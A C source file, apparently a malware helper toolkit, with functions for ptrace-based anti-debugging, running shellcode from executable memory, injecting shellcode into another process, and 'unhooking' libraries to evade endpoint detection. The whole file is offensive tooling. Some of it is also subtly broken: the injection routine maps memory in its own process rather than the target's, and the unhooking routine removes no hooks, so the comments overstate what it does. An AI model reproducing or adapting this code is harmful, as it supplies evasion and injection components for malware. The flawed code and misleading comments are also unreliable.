#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <dlfcn.h>
#include <sys/ptrace.h>
#include <sys/wait.h>

// Anti-debugging via ptrace
int anti_debug_ptrace() {
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
        return 1; // Debugger detected
    }
    return 0;
}

// Memory allocation with execute permissions
void* allocate_executable_memory(size_t size) {
    void* ptr = mmap(NULL, size, 
                    PROT_READ | PROT_WRITE | PROT_EXEC,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    return ptr;
}

// Shellcode execution with memory protection
int execute_shellcode(unsigned char* shellcode, size_t size) {
    if (anti_debug_ptrace()) {
        return -1; // Debugger detected
    }
    
    // Allocate executable memory
    void* exec_mem = allocate_executable_memory(size);
    if (exec_mem == MAP_FAILED) {
        return -1;
    }
    
    // Copy shellcode to executable memory
    memcpy(exec_mem, shellcode, size);
    
    // Execute shellcode
    int (*func)() = (int(*)())exec_mem;
    int result = func();
    
    // Cleanup
    munmap(exec_mem, size);
    
    return result;
}

// Process injection via ptrace
int inject_into_process(pid_t pid, unsigned char* shellcode, size_t size) {
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        return -1;
    }
    
    waitpid(pid, NULL, 0);
    
    // Allocate memory in target process
    void* remote_mem = allocate_executable_memory(size);
    if (remote_mem == MAP_FAILED) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }
    
    // Write shellcode to target process
    for (size_t i = 0; i < size; i += sizeof(long)) {
        long data = 0;
        memcpy(&data, shellcode + i, 
               (size - i) < sizeof(long) ? (size - i) : sizeof(long));
        ptrace(PTRACE_POKEDATA, pid, remote_mem + i, data);
    }
    
    // Create remote thread (simplified - would use more complex injection)
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    
    return 0;
}

// Library unhooking for EDR evasion
int unhook_library(const char* library_name) {
    void* handle = dlopen(library_name, RTLD_LAZY);
    if (!handle) {
        return -1;
    }
    
    // Close and reopen to get clean library
    dlclose(handle);
    handle = dlopen(library_name, RTLD_LAZY);
    
    if (handle) {
        dlclose(handle);
        return 0;
    }
    
    return -1;
}